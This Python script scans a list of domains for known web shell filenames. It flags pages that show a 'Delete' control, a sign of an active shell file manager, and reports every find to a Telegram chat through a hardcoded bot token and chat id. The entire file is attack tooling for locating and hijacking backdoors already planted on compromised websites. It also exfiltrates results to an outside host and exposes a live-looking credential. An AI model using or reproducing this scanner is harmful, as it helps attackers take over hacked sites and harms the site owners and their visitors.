from bs4 import BeautifulSoup
import requests
from colorama import Fore, Back, Style, init
init(autoreset=True)
domain_list = open("domain.txt", "r")
shellname_list = open("shellname.txt", "r")

domainread = domain_list.readline()
shellread = shellname_list.readline()
while True:
    shellread = shellname_list.readline()

    if domainread == "":
        break

    elif shellread == "":
        shellname_list.seek(0)
        domainread = domain_list.readline()

    else:
        try:
            sample_web_page = "http://"+domainread.strip()+"/"+shellread.strip()
            print(Fore.MAGENTA+"Testing : "+sample_web_page)
            page = requests.get(sample_web_page)
            print(page.status_code)

            soup = BeautifulSoup(page.content, "html.parser")
            
            child_soup = soup.find_all()
            
            text = 'Delete'
            for i in child_soup:
                if(i.string == text):
                    requests.get("https://api.telegram.org/bot5510425940:AAEK6dXiGJEjekNtBY547Ioo-LPY4Ljspk4/sendMessage?chat_id=-1001698053642&text="+sample_web_page)
                    print(Fore.GREEN+"Shell Find : "+sample_web_page)
                    break
        except:
            domainread = domain_list.readline()
            print(Fore.RED + "Not Response : "+sample_web_page)